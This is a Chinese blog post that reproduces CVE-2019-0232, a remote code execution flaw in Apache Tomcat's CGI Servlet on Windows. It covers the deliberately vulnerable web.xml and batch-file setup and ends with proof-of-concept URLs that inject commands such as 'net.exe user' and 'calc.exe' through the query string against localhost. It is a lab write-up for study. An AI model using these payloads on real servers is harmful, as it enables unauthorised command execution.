# CVE-2019-0232 漏洞复现 - zw1sh - 博客园

> 原文：[`www.cnblogs.com/zw1sh/p/13170863.html`](https://www.cnblogs.com/zw1sh/p/13170863.html)

记录一个 cve-2019-0232 的漏洞环境搭建的任务

1、相关信息

```
2019 年 4 月 11 日，Apache 官方发布通告称将在最新版本中修复一个远程代码执行漏洞（CVE-2019-0232），由于 JRE 将命令行参数传递给 Windows 的方式存在错误，会导致 CGI Servlet 受到远程执行代码的攻击。

触发该漏洞需要同时满足以下条件：
1\. 系统为 Windows
2\. 启用了 CGI Servlet（默认为关闭）
3\. 启用了 enableCmdLineArguments（Tomcat 9.0.*及官方未来发布版本默认为关闭）

影响范围
Apache Tomcat 9.0.0.M1 to 9.0.17
Apache Tomcat 8.5.0 to 8.5.39
Apache Tomcat 7.0.0 to 7.0.93 
```

2、漏洞复现

我的复现环境：

```
windows server 2008 R2

apache Tomcat 8.5.23

jdk 1.8 
```

jdk 可以去官网下载，tomcat 下载地址：[`archive.apache.org/dist/tomcat/`](https://archive.apache.org/dist/tomcat/) （最好下载 bin 目录里的文件）

然后就是配置 java 环境变量，参考 https://www.runoob.com/java/java-environment-setup.html

解压配置 tomcat，运行 startup.bat,如果这里不能正确弹出命令行窗口显示服务器已运行，可能是 java 环境变量配置有问题，也可以在 startup.bat 最后加一个 pause 让命令行在最后不关闭，看一下是否有报错信息

![](img/f4e93c2e5e445d6cd720c15d7355b04e.png)

配置好之后，需要修改一些 tomcat 的配置：

1)conf/web.xml 中启用 CGIServlet 和启用 cgi 的 servlet-mapping
注意这里可能有些版本里的 cgiPathPrefix 的值是 WEB-INF/cgi，需要改一下为我们后面创建的 WEB-INF/cgi-bin

```
<servlet>
    <servlet-name>cgi</servlet-name>
    <servlet-class>org.apache.catalina.servlets.CGIServlet</servlet-class>
    <init-param>
      <param-name>cgiPathPrefix</param-name>
      <param-value>WEB-INF/cgi-bin</param-value>
    </init-param>
    <init-param>
      <param-name>enableCmdLineArguments</param-name>
      <param-value>true</param-value>
    </init-param>
    <init-param>
      <param-name>executable</param-name>
      <param-value></param-value>
    </init-param>
    <load-on-startup>5</load-on-startup>
</servlet>

#将下面的语句的注释去掉
<servlet-mapping>
    <servlet-name>cgi</servlet-name>
    <url-pattern>/cgi-bin/*</url-pattern>
</servlet-mapping> 
```

2）之后修改 conf/context.xml 的<context>添加 privileged="true"属性</context>

3)然后在 ROOT\WEB-INF 下创建 cgi-bin 目录, 并在该目录下创建一个内容为 echo Content-type: text/html 的 .bat 文件。

```
例：hello.bat
@echo off
echo Content-Type: text/plain
echo.
set foo=%~1
%foo% 
```

3、漏洞利用

Poc 如下：

[`localhost:8080/cgi-bin/hello.bat?&C%3A\Windows\System32\net.exe+user`](http://localhost:8080/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5Cnet.exe+user)

[`localhost:8080/cgi-bin/hello.bat?&C%3A\Windows\System32\calc.exe`](http://localhost:8080/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5Ccalc.exe)
![](img/905c094c69ab7589b67a615428f07430.png)

![](img/65ed6db1de7da1533c78828ae1cca48d.png)

(这里显示联通测速页面只是设计的一个例子)

4、漏洞原理具体分析

参考：[`xz.aliyun.com/t/4875`](https://xz.aliyun.com/t/4875)